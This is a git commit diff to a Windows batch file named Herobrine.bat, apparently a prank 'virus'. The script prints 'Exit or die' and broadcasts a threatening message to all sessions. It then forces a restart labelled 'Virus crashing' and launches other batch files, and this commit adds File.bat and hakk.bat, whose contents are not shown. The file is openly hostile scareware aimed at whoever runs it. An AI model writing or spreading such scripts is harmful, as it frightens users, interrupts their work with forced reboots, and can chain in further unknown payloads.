5361493e5a4e6c7318833280a4fff9b9c9c26611
HerobrinePE <42194169+HerobrinePE@users.noreply.github.com>
2018-12-18 07:15:04 -0400

    Update Herobrine.bat

--- Herobrine.bat
+++ Herobrine.bat
@@ -4,5 +4,7 @@ color 12
 echo Exit or die
 pause
 start Null.bat
+start File.bat
+start hakk.bat
 msg * "any last words to your pc because you didnt listen to my warning"
 shutdown -r -t 180 -c "Virus crashing"
